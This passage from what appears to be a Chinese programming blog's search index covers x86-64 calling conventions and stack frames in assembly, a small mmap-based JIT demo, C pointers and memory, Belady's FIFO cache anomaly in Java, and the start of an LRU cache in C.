= clock(); result = fib(LENGTH - 1); endTime = clock(); printf(\"Running Time %f Seconds\\n\",(double)(endTime - beginTime)/CLOCKS_PER_SEC); printf(\" %d :: %lu \\n\", LENGTH - 1, result); return 0; } fib(n) 开辟栈帧总数量可以表示为: sum(n) = 2^(n - 2) + 1 (n \u003e= 3). 时间复杂度是: O(2^n) fib(50) 开辟栈帧总量是: sum(50) = 2^(48) + 1 时间复杂度是: O(2 ^ 50) 计算 fib(50) 费了 65 秒左右 解决方法 用数组保存已经计算出来的 fib(n) 的结果. 修改计算逻辑, 如果 fib(n) 已经被计算, 直接使用, 不再进入递归计算. 这可不就是有拿空间换时间的感觉. ","问题描述#问题描述":" 第一个月初有一对刚诞生的兔子 第二个月之后(第三个月)它们可以生育 每月每对可生育的兔子会诞生下一对新兔子 兔子永不死 问第 n 月有多少对兔子?"},"title":"asm-how-recursion-function-execute"},"/blog/asm-how-x86-64-arguments-pass/":{"data":{"":"","#":"","c-main#C main":"","reference#Reference":"x86-64 下函数参数传递, 汇编层面分析 To pass parameters to the subroutine, we put up to six of them into registers (in order: rdi, rsi, rdx, rcx, r8, r9).\nIf there are more than six parameters to the subroutine, then push the rest onto the stack in reverse order (i.e. last parameter first)\n– since the stack grows down, the first of the extra parameters (really the seventh parameter) parameter will be stored at the lowest address (this inversion of parameters was historically used to allow functions to be passed a variable number of parameters).\n代码分析C main int main(){ int result = 0; result = testArgs(1,2,3,4,5,6,7,8); return 0; } Asm main gcc -o main main.c\nmain: pushq %rbp movq %rsp, %rbp subq $16, %rsp movl $0, -4(%rbp) ;result pushq $8 ; 最后一个参数 pushq $7 ; 倒数第二个参数 movl $6, %r9d ; 第六个参数 movl $5, %r8d ; 第五个参数 movl $4, %ecx ; 第四个参数 movl $3, %edx ; 第三个参数 movl $2, %esi ; 第二个参数 movl $1, %edi ; 第一个参数 call testArgs(long, long, long, long, long, long, long, long) addq $16, %rsp ; 回收分配的栈空间 movl %eax, -4(%rbp) movl $0, %eax leave ret C testArgs int testArgs(long a1,long a2,long a3,long a4,long a5,long a6,long a7,long a8){ long sum = 0; sum = a1 + a2 + a3 + a4 +a5 + a6 + a7 + a8; return sum; } Asm testArgs testArgs(long, long, long, long, long, long, long, long):\rpushq %rbp\rmovq %rsp, %rbp\rmovq %rdi, -24(%rbp) ; a1 栈底\rmovq %rsi, -32(%rbp) ; a2\rmovq %rdx, -40(%rbp) ; a3\rmovq %rcx, -48(%rbp) ; a4\rmovq %r8, -56(%rbp) ; a5\rmovq %r9, -64(%rbp) ; a6\rmovq $0, -8(%rbp) ; sum\rmovq -24(%rbp), %rdx ; a1\rmovq -32(%rbp), %rax ; a2\raddq %rax, %rdx ; rdx = a1 + a2\rmovq -40(%rbp), %rax ; a3\raddq %rax, %rdx\rmovq -48(%rbp), %rax ; a4\raddq %rax, %rdx\rmovq -56(%rbp), %rax ; a5\raddq %rax, %rdx\rmovq -64(%rbp), %rax ; a6\raddq %rax, %rdx\rmovq 16(%rbp), %rax ; a7，其实是到 main 的栈帧里取的,main 准备的参数,因为 rbp 就是 stack frame 的栈底\raddq %rax, %rdx\rmovq 24(%rbp), %rax ; a8，其实是到 main 的栈帧里取的,main 准备的参数\raddq %rdx, %rax\rmovq %rax, -8(%rbp) ; sum = rax\rmovq -8(%rbp), %rax ; rax = sum 也就是返回值\rpopq %rbp\rret 综上可知，编译器默认会将所有的参数复制到栈上。\n栈帧分析 #(x86-64-arguments-pass) 栈顶在下方\n上图是执行完 testArgs 前两句汇编的栈帧状态图.\n分析: testArgs 中 movq 16(%rbp), %rax ; 将 rbp + 16 地址处的数值(参数 a7)复制到 rax\nrbp + 16 的原因是: 参数 a7 是 main 准备的, 属于 main 的栈帧.\n16 Bytes 包括 8 Bytes 的 Return address(main 函数中的 call 指令压入的 call 指令下一条指令的地址)\n和 8 Bytes 的 main 的 rbp(testArgs 函数中第一条指令: pushq %rbp).\nReference callee-caller ","代码分析#代码分析":"","栈帧分析#栈帧分析":""},"title":"asm-how-x86-64-arguments-pass"},"/blog/asm-how-x86-function-execute/":{"data":{"addressing-mode寻址模式#addressing mode(寻址模式)":"","asm-execute-graph#asm execute graph":"","assembly-syntax-for-x86#assembly syntax for X86":"","bombs#bombs":"","c-compare-to--assembly#C compare to  Assembly":"","call#\u003ccode\u003ecall\u003c/code\u003e \u003clabel\u003e":"","call-stack#call stack":"","change-control-flow改变控制流#change control flow(改变控制流)":"","code-analysis#code analysis":"","direct-addressing直接寻址#direct addressing(直接寻址)":"","example#example":"","function-call-and-return#function call and return":"","gas-gnu-assembler-syntax-也就是-att-风格#gas (gnu assembler syntax), 也就是 AT\u0026amp;T 风格.":"","indirect-addressing间接寻址#indirect addressing(间接寻址)":"","instruction-suffixes#instruction suffixes":"","intel-syntax#intel syntax":"","jmp-label#\u003ccode\u003ejmp\u003c/code\u003e label":"","popl-eax#\u003ccode\u003epopl\u003c/code\u003e %eax":"","program-counter-for-stored-program#program counter for stored program":"","pushl-eax#\u003ccode\u003epushl\u003c/code\u003e %eax":"","references#references":" 前一阵子去看 java 虚拟机原理, 忽然痛悟到虚拟机也是机器啊, 呵呵也就是个软件而已. 看到 java 方法调用太复杂. 字节码那一套又不太熟悉, 还不如直接去看 C 编译后的汇编代码. 目的: 搞明白 X86 架构下函数到底是怎么调用执行的. 这其实就是 Application Binary Interface 之 Function Calling Conventions。\nassembly syntax for X86gas (gnu assembler syntax), 也就是 AT\u0026T 风格. 本文采用该风格.\nswap(int, int): pushq %rbp movq %rsp, %rbp movl %edi, -20(%rbp) movl %esi, -24(%rbp) movl -20(%rbp), %eax movl %eax, -4(%rbp) movl -24(%rbp), %eax movl %eax, -20(%rbp) movl -4(%rbp), %eax movl %eax, -24(%rbp) nop popq %rbp ret intel syntax swap(int, int):\rpush rbp\rmov rbp, rsp\rmov DWORD PTR [rbp-20], edi\rmov DWORD PTR [rbp-24], esi\rmov eax, DWORD PTR [rbp-20]\rmov DWORD PTR [rbp-4], eax\rmov eax, DWORD PTR [rbp-24]\rmov DWORD PTR [rbp-20], eax\rmov eax, DWORD PTR [rbp-4]\rmov DWORD PTR [rbp-24], eax\rnop\rpop rbp\rret instruction suffixes 缩写 全称 位数 b byte 8bit w word 16bit l long 32bit q quad 64bit addressing mode(寻址模式) CPU 寻址方式, 也就是拿到数据的方式.\ndirect addressing(直接寻址) movb $0x05,%al\n表示为:R[al] = 0x05;\n将立即数 0x05(1 byte) 复制到寄存器 al\nindirect addressing(间接寻址) 间接寻址也就是到内存里去找\nregister to memory movl %eax, -4(%ebp)\n表示为: mem[R[ebp]-4] = R[eax];\n将寄存器 eax 里面的值复制到寄存器 ebp 的值减去 4 指向的内存地址处(也就是 R[ebp] -4 的值是一个内存地址).\n通过寄存器指向了内存地址, 是不是很熟悉的指针啊, 对, 就是指针. C 语言的指针就是这么玩的啊!\nmemory to register movl -4(%ebp), %eax\n%eax 表示为: R[eax] = mem[R[ebp] -4];\n将寄存器 esp 的值减去 4 的值指向的内存地址处存放的值, 复制到寄存器 eax\nprogram counter for stored program PC = PC + \\(instruction size in bytes\\)\n(instruction) (src1) (src2) (dst)\nIn most processors, the PC is incremented after fetching an instruction, and holds the memory address of (“points to”) the next instruction that would be executed.\n这里就用到了指令周期(instruction cycle)这个概念了, fetch, decode, execute. 注意到 PC 这个寄存器, 在 CPU fetch 了一条指令后就自动增加了. (In a processor where the incrementation precedes the fetch, the PC points to the current instruction being executed.)\n同样的在 CPU fetch 一条指令之前, PC 指向当前正在执行的指令.\n注意: 不直接操作 ip(instruction pointer) 也叫 pc(program counter) 这个寄存器, 如果这个能被编译器直接操作的话, 就完全想跳到哪执行就跳到哪执行了. 实际上 call 和 ret 指令就是在间接操作 pc 这个寄存器. call 带来的效果之一就是 push %rip, ret 带来的效果之一就是 pop %rip. 两者具有对称作用啊!\nchange control flow(改变控制流)jmp label When a jump instruction executes (in the last step of the machine cycle), it puts a new address into the PC. Now the fetch at the top of the next machine cycle fetches the instruction at that new address. Instead of executing the instruction that follows the jump instruction in memory, the processor “jumps” to an instruction somewhere else in memory.\njmp 指令把 label 所在的地址, 复制给 pc 寄存器. 这就改变了程序的控制流. 然后程序流程就脱离了原来的执行流. 和 call label 很相似, 对, call 指令作用之一就包括了一个隐式的 jmp label. 函数调用也就是把控制权交给了被调用者. 但是控制权最后要回到调用函数那里. 只不过 call 指令在函数交出控制权之前还多干了一件事, 就是把此时的 pc 值 push 到了栈里.\nstack managementstack pointer A stack register is a computer central processor register whose purpose is to keep track of a call stack.\npush pop 指令操作的是 sp(stack pointer) 这个寄存器.\n栈底地址: 由bp(base pointer) 保存\n栈分配空间: sp 减去需要的地址空间大小(所谓的栈向下生长);\n栈回收空间: sp 加上需要的地址空间大小(所谓的栈向上收缩);(PS: 相当无聊的话)\n#(x86-64-stack)\npushl %eax push value of %eax onto stack The push instruction places its operand onto the top of the hardware supported stack in memory. Specifically, push first decrements ESP by 4, then places its operand into the contents of the 32-bit location at address [ESP]. ESP (the stack pointer) is decremented by push since the x86 stack grows down - i.e. the stack grows from high addresses to lower addresses.\n这里可以看到 push 的是多字节的数据, 那就涉及到怎样排列多字节数据的问题了. 也就是所谓的字节序的问题. X86 采用所谓的小端, 也就是把数字按照顺序放到栈里, 数字的高位放在了比较大的内存地址那里.(这里不做讨论) 作用等价于\nsubl $4, %esp ;分配4个字节的空间, 所谓的栈向下生长 movl %eax, (%esp) ;将 eax 的值复制到 esp 指到的内存地址处 popl %eax pop %eax off stack The pop instruction removes the 4-byte data element from the top of the hardware-supported stack into the specified operand (i.e. register or memory location). It first moves the 4 bytes located at memory location [ESP] into the specified register or memory location, and then increments SP by 4. 作用等价于\nmovl (%esp),%eax ;将 esp 指向的内存地址里面的值复制到 eax addl $4,%esp ;回收空间 function call and returncall The call instruction first pushes the current code location onto the hardware supported stack in memory(see the push instruction for details), and then performs an unconditional jump to the code location indicated by the label operand. Unlike the simple jump instructions, the call instruction saves the location to return to when the subroutine completes.\n注意到 CPU 在 fetch 到 call 指令后, PC 就已经自动加 1 了. 此时的 PC 值也就是所谓的函数返回地址. call 指令做了两件事, 第一件事: 将此时的 ip 保存到栈中, 第二件事: jump 到 label 位置, 此时已经改变了 PC 的值.\ncall label 作用等价于\npushq %rip jmp label ret The ret instruction implements a subroutine return mechanism. This instruction first pops a code location off the hardware supported in-memory stack (也就是 call 指令压入栈中的 PC, 将这个值复制到 PC 寄存器)(see the pop instruction for details). It then performs an unconditional jump to the retrieved code location.\n所以啊, call(含有一个 push 操作) 和 ret(含有一个 pop 操作) 指令, 这是实现控制流跳转和恢复的关键. 也间接操作了 sp 这个寄存器. 硬件实现的功能, 不需要过多的计较.\nret\n作用等价于:\npopq %rip call stack In computer science, a call stack is a stack data structure that stores information about the active subroutines of a computer program. This kind of stack is also known as an execution stack, program stack, control stack, run-time stack, or machine stack, and is often shortened to just “the stack”.\nA call stack is used for several related purposes, but the main reason for having one is to keep track of the point to which each active subroutine should return control when it finishes executing.\nAn active subroutine is one that has been called but is yet to complete execution after which control should be handed back to the point of call. Such activations of subroutines may be nested to any level (recursive as a special case), hence the stack structure.\nexample for example, a subroutine DrawSquare calls a subroutine DrawLine from four different places, DrawLine must know where to return when its execution completes.\nTo accomplish this, the address following the instruction that jumps to DrawLine, the return address, is pushed onto the call stack with each call.\n#(callstack-layout-for-upward-growing-stacks)\ncode analysis void swap(int a, int b){ int tmp = a; a = b; b = tmp; } ; 64 bit 机器 , AT\u0026T 风格的汇编 swap(int, int): pushq %rbp ; 上一个栈帧(main)的基地址压栈 等价于 subq $8, %rsp; movq %rbp,(%rsp) movq %rsp, %rbp ; 开辟新的函数栈帧, 也就是形成一个新的栈的基地址 movl %edi, -20(%rbp) ; 参数 a movl %esi, -24(%rbp) ; 参数 b movl -20(%rbp), %eax ; 把 a 赋值给 %eax movl %eax, -4(%rbp) ; 把 %eax (a)赋值给 %rbp - 4(a) 的地址处 movl -24(%rbp), %eax ; 把 b 赋值给 % eax（b） movl %eax, -20(%rbp) ; 把 %eax (b) 赋值给 %rbp - 20（b） 的地址处,完成 b 的交换 movl -4(%rbp), %eax ; 把 %rbp - 4 地址处的值(a) 赋值给 %eax (a) movl %eax, -24(%rbp) ; 把 %eax (a) 赋值给 %rbp - 24 的地址处, 完成 a 的交换 nop ; 延时 popq %rbp ; 等价于 movq (%rsp), %rbp ; 上一个函数栈帧(main)的基地址恢复; addq $8, %rsp ; 上一个函数的 %rsp 恢复 ret ; 1. popq %rip. (恢复 main 的 pc, call swap 这条指令压入的 pc ) 2. jmp % rip 处继续执行.(也就是 movl $0, %eax 这条指令的地址) int main() { swap(1, 2); return 0; } main: pushq %rbp movq %rsp, %rbp movl $2, %esi ; 由 caller(main 函数) 准备函数参数 2 movl $1, %edi ; 由 caller(main 函数) 准备函数参数 1 call swap ; 在 CPU fetch 了 call 指令后, pc 已经指向了下一条指令, 也就是 movl $0, %eax 这条指令. 此时的 call 指令完成了两件事, 第一件事: 将 pc(old) 压入到栈中(swap 函数 ret 指令(函数返回)就是把这个 pc(old) pop 到 pc 这个寄存器, CPU 就能接着执行 movl $0, %eax 这条指令了), 第二件事: jump 到swap的地址, 开始执行swap的代码. movl $0, %eax ; 返回值 0 popq %rbp ret C compare to Assembly\nasm execute graph\n注意: 示意图里面的是 64 bit 的汇编代码.\n注意: 所有的 push 和 pop 指令都会改变 sp 寄存器的值.\n图1 main 函数执行完 pushq %rbp 和 movq %rsp, %rbp, 开辟 main 函数的栈帧.\n图2 main 函数执行 call swap. call 指令两个作用: 1. 将 movl $0, %eax 这条指令的地址(X)压入栈中. 2. jump 到 swap 的地址.\n图3 是 swap 函数的栈帧, 此时新函数的栈帧 rsp 和 rbp 指向的是相同的内存地址.\n图4 所有的 mov 使用的内存地址, 都是通过 rbp 来偏移得到, rbp 的值并没有发生改变.\n图5 执行完 popq %rsp, 恢复 main 函数的栈基址(rbp), 也就是和图1 一样.\n图6 执行完 ret 恢复为 main 函数的栈帧(这里主要是 rsp, rbp, pc, 个人理解把 pc 视为栈帧的一部分, 因为函数调用控制权发生转移, 幕后也离不开 pc 这个寄存器的变化).\nret 的作用等价于 popq %rip. 但是无法直接操作 ip(pc) 这个寄存器.\n也就相当于间接改变 ip. 此时 pc 已被 ret 指令恢复成了 X. (此时实际上控制权已经回到 main 函数了), 接下来就是继续执行 main 函数的代码.\n其实 swap 函数的栈帧已经被销毁了. 也就是再也访问不到 swap 函数里的变量了. 这就是 C 语言里的所谓的本地变量的本质.\n注意: 图1 和 图6 , 图2 和 图5 完全一样, 这不是有意为之, 按照 X86 的函数调用机制就是这样的. 在被调用函数(swap)执行 popq % rbp, 这条指令就是要恢复调用函数(main)的 rbp, 执行 ret 这条指令就是要恢复调用函数(main)的下一条指令的地址. 也就是将 pc 的值恢复为 X, 这样就可以接着执行了嘛. 也就是所谓的恢复调用者(main)的栈帧.\n也就是 main 函数调用 swap 函数(call 指令)保留 main 的状态(也就是 main 函数的 rbp 和 pc), swap 执行到最后(popq, ret)负责恢复现场(也就是恢复 main 函数的 rbp 和 pc). call 和 ret 指令的也分别有 push %rip 和 pop %rip 的作用. 很对称的操作!\nbombs pushq %rbp ; 保留上一个函数(也就是调用者)的栈基址 movq %rsp, %rbp ; 新函数的栈基址. 一个新的栈帧 sp 和 bp 指向的是同一个地址 一个所谓的栈帧(stack frame)就是由 sp(stack pointer) 和 bp(base pointer) 这两个寄存器来维护的。\n在编译器没有开启优化情况下，这两句会出现在每一个函数的开始, 那么问题来了 main 函数里面保留的是哪一个调用函数的栈基址呢?\n个人推测, 不一定正确, 我们知道创建进程(线程)是 OS 内核的功能, 当然进程销毁也是内核的功能.\n内核同样维护着属于内核空间的栈帧, 当进程创建完毕后, 我们写的 C 代码应该是被内核里的函数调用的, 这样的话 main 里面 pushq %rbp 应该是保留的内核函数的栈基址. 这样 main 的 ret 返回后就能接着执行内核函数里面的逻辑了. (估计也就是销毁进程一系列操作了, 这样才能把分配的资源收回来啊!)\nreferences program counter A reader’s guide to x86 assembly x86 guide instruction cycle how jump work stack pointer call stack stack-winding(push)-unwinding(pop) understand-heap-assembly eax-x86-register-meaning-and-history flint.cs.yale.edu/cs421/papers/x86-asm/asm.html at\u0026t 语法 x86-instruction-list stack-frame-example x64 ","ret#\u003ccode\u003eret\u003c/code\u003e":"","stack-management#stack management":"","stack-pointer#stack pointer":""},"title":"asm-how-x86-function-execute"},"/blog/asm-java-jit/":{"data":{"":"","references#References":"前言 无论多么花里胡哨的功能，最终落地到一台计算机上，都是二进制代码。虽然 java 代码跑在 jvm 平台之上，但是 jvm 只是负责执行 java 自定义的一套 bytecode 的工具，只要能解释字节码，这个工具用什么语言写都是可以的。主流的 HotSpot 虚拟机选择的 C++。\n二进制代码探析 C 语言举例 gcc 不开启优化 #include\u003cstdio.h\u003e long desc(long a) { return a - 1; } int main() { printf(\"%ld\\n\", desc(3)); return 0; } 具体汇编级别的参数传递 可以参考这篇。x86 架构下函数如何之行 可以参考这篇。\ngcc -o descv1 desc.c 之后通过 objdump -d descv11 可以找到 long desc(long a) 的汇编代码如下：\n000000000000064a \u003cdesc\u003e: 64a: 55 push %rbp ;❶ 保存上一个栈帧的 base，进入一个函数的常规操作。 64b: 48 89 e5 mov %rsp,%rbp ;❷ 开辟新的栈帧 64e: 48 89 7d f8 mov %rdi,-0x8(%rbp) ;❸ 参数 a（rdi）入栈 652: 48 8b 45 f8 mov -0x8(%rbp),%rax ;❹ 参数 a 从栈中复制到 rax 656: 48 83 e8 01 sub $0x1,%rax ;❺ a = a - 1 65a: 5d pop %rbp ;❻ 弹出 rbp，也即是恢复上一个栈帧的 base 65b: c3 retq ;❼ 函数返回 可以看到 ❸ 和 ❹ 这两步有些多余，这是没有开启优化，gcc 默认采用的方式，把所有的参数先放到栈上。我们可以进行优化。\n对 gcc 不开启优化选项的汇编代码优化 #include \u003cstdio.h\u003e #include \u003cmemory.h\u003e #include \u003csys/mman.h\u003e typedef int (*desc_func)(int a); int main() { char desc_code[] = { 0x55, // ❶ push rbp 0x48, 0x89, 0xe5, // ❷ mov rsp, rbp 0x89, 0xf8, // mov edi, eax ?? 0x48, 0x83, 0xe8, 0x01, // sub $0x1,%rax 0x5d, // ❻ pop rbp 0xc3 // ❼ ret }; void *temp = mmap(NULL, sizeof(desc_code), PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); memcpy(temp, desc_code, sizeof(desc_code)); desc_func p_desc = (desc_func)temp; printf(\"%d\\n\", p_desc(3)); return 0; } 可以看到在运行中创建 desc 函数，运行时生成可执行的机器码这种方式其实就是 JIT 实现的核心操作。 同时可以看到，根本没有必要开辟栈帧来执行这个 desc 函数。也就是可以把 ➊ ➋ ➏ 栈帧相关操作删除。\n进一步优化，消除栈帧 #include \u003cstdio.h\u003e #include \u003cmemory.h\u003e #include \u003csys/mman.h\u003e typedef int (*desc_func)(int a); int main() { char desc_code[] = { 0x89, 0xf8, // mov edi, eax ?? 0x48, 0x83, 0xe8, 0x01, // sub $0x1,%rax 0xc3 // ❼ ret }; void *temp = mmap(NULL, sizeof(desc_code), PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); memcpy(temp, desc_code, sizeof(desc_code)); desc_func p_desc = (desc_func)temp; printf(\"%d\\n\", p_desc(3)); return 0; } 可以看到不开辟栈帧，一样可以执行代码。\nlea addr dst 优化 char code[] = { 0x48, 0x8d, 0x47 0xff, // lea -0x1(rdi), rax lea 直接将 rdi 寄存器里的值减去 1 复制给 rax 0xc3 // ret }; 这个和 gcc -o desc desc.c -O2 结果是一样的。\nReferences java 杂谈之 JIT x64-instruction-table https://web.stanford.edu/class/archive/cs/cs107/cs107.1166/guide_x86-64.html http://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf load-effective-address(lea) java-bytecode 圆圈数字等 ","二进制代码探析#二进制代码探析":"","前言#前言":""},"title":"asm-java-jit"},"/blog/asm-pointers-and-memory/":{"data":{"":"","basic-pointer#Basic Pointer":"","memory#memory":"","ownership#ownership":" each blok of memory has exactly one “owner” who takes responsibility for deallocating it.\ncaller ownership callee allocated and return ","parameter#parameter":"Basic Pointer 为啥需要 Pointer？ 更容易在不同代码段之间共享信息，在不同代码段之间来回复制也是可以的。但用指针的形式更好。 链式数据结构, 如链表和二叉树。 pointer dereference 指针必须要有指向的值，才可以 dereference。 没有指向的指针，dereference 时会 runtime error。\nNULL pointer C -\u003e NULL -\u003e 0 -\u003e false java -\u003e null\npointer assignment 指针赋值\ncopy shallow copy copy reference\ndeep copy copy real value\ntwo levels C 语言下指针探析 long pointer(void * ptr){ long *p = (long*)ptr; return *p; } pointer: pushq %rbp movq %rsp, %rbp movq %rdi, -24(%rbp) movq -24(%rbp), %rax movq %rax, -8(%rbp) movq -8(%rbp), %rax movq (%rax), %rax popq %rbp ret 由上可知：long *p = (long*)ptr 被编译成\nmovq -8(%rbp), %rax %rax 这个寄存器里放的是传来的指针 movq (%rax), %rax (%rax) 寄存器间接寻址，也就是取寄存器 %rax 指向的内存里的值。这就是指针在汇编层面的意义。 memory variable -\u003e variable name -\u003e memory 编译后，变量名就没有了。\nlocal memory local memory is allocated automatically on function call and it is deallocated automatically when a function exits.\n编译器管理 local memory，size 编译时决定。 Local memory 最根本的性质：相互独立，这是本地内存优点和缺点的根本原因。\nstack frame local memory 通过调用函数时创建的栈帧来体现。\nallocation 栈帧创建时, local variable 一并创建。\ndeallocation 栈帧销毁时，local variable 一并销毁。\nlifetime 随着函数栈帧同生共死。\nlocal/stack/automatic variable 栈帧中的变量。 local/automatic 底层经常使用 stack 结构来实现。\nadvantage of locals convenient. 函数需要临时的内存空间做计算，计算完毕后，释放。 efficient. 分配和释放都很快。 local copies. pass by value local parameters are basically local copies of the information from the caller. caller 原值 callee 副本，如何修改不影响 caller 中的值 软件设计原则：seperate components\ndisadvantage of locals short lifetime. 和栈帧同生共死。(heap memory 解决) restricted communication。caller’s parameter -\u003e callee 单向通信。(reference parameter 解决) heap/dynamic memory malloc() free()\nlifetime 程序员自主决定何时申请内存, 申请多少内存，何时释放内存。 runtime 决定。\nparameter pass by value local copy caller parameter(原值) callee parameter(副本) separate components\npass by reference 其实就是指针。这个二级结构。 pointer(上级)，把上级传出去，就可以指挥下级了。 pointee(下级) 一级指针也可以理解为 hop，非常像 router 中的下一跳。","reference#Reference":" memory and pointers malloc free square-function ","two-levels#two levels":""},"title":"asm-pointers-and-memory"},"/blog/bloomfilter/":{"data":{"":"","references#References":" bloom filter\nbloom filter\nhttps://coderscat.com/bloom-filter/"},"title":"bloomfilter"},"/blog/cache-miss-anomaly/":{"data":{"capacity-miss#capacity miss":" 缓存容量有限，需要 evict 一些页","compulsory-miss#compulsory miss":" 一开始缓存里啥都没有，cold-start miss","conflict-miss#conflict miss":" cpu cache 的 set-associativity 的缓存行","references#References":" https://pages.cs.wisc.edu/~remzi/OSTEP/vm-beyondphys-policy.pdf ","缓存-miss-类型#缓存 miss 类型":"缓存 miss 类型","缓存越大命中率就越高么不是的#缓存越大，命中率就越高么？不是的":" 1, 2, 3, 4, 1, 2, 5, 1, 2, 3, 4, 5 采用 FIFO 的 swap 策略。容量为 3 的缓存，比容量为 4 的缓存命中率更高\nimport java.util.concurrent.ArrayBlockingQueue; public class CacheFifo { public static void main(String[] args) { Integer[] pages = {1, 2, 3, 4, 1, 2, 5, 1, 2, 3, 4, 5}; calculateCacheHit(pages, 3); calculateCacheHit(pages, 4); } private static void calculateCacheHit(Integer[] pages, int cacheSize) { System.out.print(\"缓存页: \"); dumpArray(pages); ArrayBlockingQueue\u003cInteger\u003e queue = new ArrayBlockingQueue(cacheSize); int miss = 0; for (int page : pages) { if (!queue.contains(page)) { miss = miss + 1; if (!queue.isEmpty() \u0026\u0026 queue.size() == cacheSize) { dumpArray(queue.toArray()); queue.poll(); } queue.offer(page); dumpArray(queue.toArray()); } } System.out.println(\"cache miss:\" + miss); System.out.println(\"total :\" + pages.length); System.out.println(\"cache hit:\" + (1 - miss * 1.0 / pages.length)); } private static void dumpArray(Object[] array) { for (Object o : array) { System.out.print(o + \" \"); } System.out.println(); } } 缓存页: 1 2 3 4 1 2 5 1 2 3 4 5 1 1 2 1 2 3 1 2 3 2 3 4 2 3 4 3 4 1 3 4 1 4 1 2 4 1 2 1 2 5 1 2 5 2 5 3 2 5 3 5 3 4 cache miss:9 total :12 cache hit:0.25 缓存页: 1 2 3 4 1 2 5 1 2 3 4 5 1 1 2 1 2 3 1 2 3 4 1 2 3 4 2 3 4 5 2 3 4 5 3 4 5 1 3 4 5 1 4 5 1 2 4 5 1 2 5 1 2 3 5 1 2 3 1 2 3 4 1 2 3 4 2 3 4 5 cache miss:10 total :12 cache hit:0.16666666666666663 "},"title":"Cache Miss Anomaly"},"/blog/cache-replacement-policy-lru/":{"data":{"":"","cache#Cache":"cache 为啥要有 Cache 呢？根本原因是各种存储速度不匹配。或者为了加快某个过程，直接将多次转换的转换结果直接缓存起来，便于再次使用时直接绕开这些转换过程。典型的就是 MMU 的地址翻译过程，直接将虚拟地址多次转换的最后结果，也就是物理地址，直接缓存到 TLB 中，下次再次访问同一个虚拟地址，直接从虚拟地址拿到物理地址，绕开多次转换过程，这可不就提高了速度。CPU 的速度比 Memory 快得多，为了配上 CPU 超级快的速度，也就有了 L1，L2，L3 cache。还有就是存储器层次结构，速度快，容量小的存储作为速度慢，容量大的上级缓存。\ncache replacement 为啥要有 cache replacement 呢？ 因为再大的存储容量也有限，总有使用完的时候，何况速度快的存储，容量本身就小。cache 使用完，再有需要缓存的东西，就需要从缓存中剔除一些，来存放新的内容。那问题就来了，缓存使用完，该剔除哪些已经缓存的内容呢？ 这就是所谓的 cache replacement policy。从不同的角度，可以有不同的替换策略。\nleast recently used 本文来说明这个策略。我不想记忆定义。来通过一个实例来理解这个策略的思想。 磁盘要缓存到内存中的内容划分为相等的 page，称之为 virtual page，每一个 page 一个编号，称之为 page number。 同理，内存的容量也划分为和磁盘大小一致的 page，称之为 page frame。 以下为访问磁盘 page number 的顺序： 1, 2, 3, 4, 1, 2, 5, 1, 2, 3, 4, 5 缓存大小为 3 个 page frame。组成一个缓存 Queue\nvirtual page 存放规则 缓存队列没满 virtual page 已在缓存队列中，将代表 virtual page 的队列节点移动到队首。 virtual page 不在缓存队列中，添加代表这个 virtual page 的队列节点到队首。 缓存队列已满 virtual page 已在缓存队列中，将代表 virtual page 的队列节点移动到队首。 virtual page 不在缓存队列中，移除队尾队列节点，添加代表这个 virtual page 的队列节点到队首。 LRU 图解 可以看到一直是对缓存队列队首操作。 1, 2, 3, 4, 1, 2, 5, 1, 2, 3, 4, 5\n访问 page 1，缓存队列中没有，page 1 放到队首。 访问 page 2，缓存队列中没有，page 2 放到队首。 访问 page 3，缓存队列中没有，page 3 放到队首。 访问 page 4，缓存队列中没有，且缓存队列满了。移除队尾 page 1，page 4 放到队首。 访问 page 1，缓存队列中没有，且缓存队列满了。移除队尾 page 2，page 1 放到队首。 访问 page 2，缓存队列中没有，且缓存队列满了。移除队尾 page 3，page 2 放到队首。 访问 page 5，缓存队列中没有，且缓存队列满了。移除队尾 page 4，page 5 放到队首。 访问 page 1，缓存队列中有，page 1 移动到队首。 访问 page 2，缓存队列中有，page 2 移动到队首。 访问 page 3，缓存队列中没有，且缓存队列满了。移除队尾 page 5，page 3 放到队首。 访问 page 4，缓存队列中没有，且缓存队列满了。移除队尾 page 1，page 4 放到队首。 访问 page 5，缓存队列中没有，且缓存队列满了。移除队尾 page 2，page 5 放到队首。 最后缓存队列中存放的是 page 5，page 4，page 3。 由上可知从队首到队尾包含着一个信息就是，越接近队首，越是最近刚访问的 page。缓存背后的原理其实和程序运行的局部性原理有关。 通过上述操作，可以看到队列节点调整非常频繁，且队列节点之间有先后关系。这也决定了队列是个双端队列。 QNode 指针数组指向已经在缓存队列中的代表 page 的队列节点。\nLRU 实现 // A C program to show implementation of LRU cache #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e // A Queue Node (Queue is implemented using Doubly Linked List) typedef struct QNode { struct QNode *prev, *next; unsigned pageNumber; // the page number stored in this QNode } QNode; // A Queue (A FIFO collection of Queue Nodes) typedef struct Queue { unsigned count; // Number of filled frames unsigned numberOfFrames; // total number of frames QNode *front, *rear; } Queue; // A hash (Collection of pointers to Queue Nodes) // 怎样判定 page 是不是已经在 cache 中，用这个结构。 typedef struct Hash { int capacity; // how many pages can be there QNode* *array; // an array of queue nodes pointer，QNode 指针数组下标作为 page number 直接索引得到 QNode，或者判定 QNode 存在与否。 } Hash; // A utility function to create a new Queue Node. The queue Node // will store the given 'pageNumber' QNode* newQNode( unsigned pageNumber ) { // Allocate memory and assign 'pageNumber' QNode* temp = (QNode *)malloc( sizeof( QNode ) ); temp-\u003epageNumber = pageNumber; // Initialize prev and next as NULL temp-\u003eprev = temp-\u003enext = NULL; return temp; } // A utility function to create an empty Queue. // The queue can have at most 'numberOfFrames' nodes Queue* createQueue( int numberOfFrames ) { Queue* queue = (Queue *)malloc( sizeof( Queue ) ); // The queue is empty queue-\u003ecount = 0; queue-\u003efront = queue-\u003erear = NULL; // Number of frames that can be stored in memory queue-\u003enumberOfFrames = numberOfFrames; return queue; } // A utility function to create an empty Hash of given capacity // capacity 其实就是 page number 范围 Hash* createHash( int capacity ) { // Allocate memory for hash Hash* hash = (Hash *) malloc( sizeof( Hash ) ); printf(\"====\u003e%d\\n\", sizeof(Hash)); hash-\u003ecapacity = capacity; // Create an array of pointers for refering queue nodes hash-\u003earray = (QNode **) malloc( hash-\u003ecapacity * sizeof( QNode* ) ); // Initialize all hash entries as empty int i; for( i = 0; i \u003c hash-\u003ecapacity; ++i ) 